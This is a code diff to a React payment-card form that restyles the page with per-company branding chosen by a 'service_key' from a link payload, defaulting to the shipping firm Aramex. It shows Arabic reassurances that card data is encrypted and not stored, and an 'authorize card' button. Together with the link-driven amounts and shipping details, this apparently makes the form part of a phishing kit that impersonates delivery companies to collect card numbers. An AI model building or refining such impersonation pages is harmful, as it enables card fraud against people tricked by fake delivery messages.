@@ -5,6 +5,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { getBrandingByCompany } from "@/lib/brandingSystem";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
 import { Shield, CreditCard, AlertCircle, ArrowLeft } from "lucide-react";
@@ -27,6 +28,11 @@ const PaymentCardForm = () => {
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+  const enhancedBranding = getBrandingByCompany(serviceKey);
+  
+  // Use enhanced branding if available
+  const colors = enhancedBranding?.colors || branding?.colors || { primary: '#DC291E', secondary: '#8B1A12' };
+  const gradients = enhancedBranding?.gradients || { primary: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})` };
   const shippingInfo = linkData?.payload as any;
 
   // Get amount from link data - ensure it's a number, handle all data types
@@ -149,11 +155,11 @@ const PaymentCardForm = () => {
       <div 
         className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2"
         style={{
-          background: `${branding.colors.primary}10`,
-          border: `1px solid ${branding.colors.primary}30`
+          background: `${colors.primary}10`,
+          border: `1px solid ${colors.primary}30`
         }}
       >
-        <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0" style={{ color: branding.colors.primary }} />
+        <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0" style={{ color: colors.primary }} />
         <p className="text-xs sm:text-sm">
           بياناتك محمية بتقنية التشفير. لا نقوم بحفظ بيانات البطاقة
         </p>
@@ -163,7 +169,7 @@ const PaymentCardForm = () => {
       <div 
         className="rounded-2xl p-5 sm:p-6 mb-6 relative overflow-hidden shadow-lg"
         style={{
-          background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
+          background: gradients.primary,
           minHeight: '180px'
         }}
       >
@@ -297,7 +303,7 @@ const PaymentCardForm = () => {
           size="lg"
           className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
           style={{
-            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+            background: gradients.primary
           }}
         >
           <span className="ml-2">تفويض البطاقة</span>
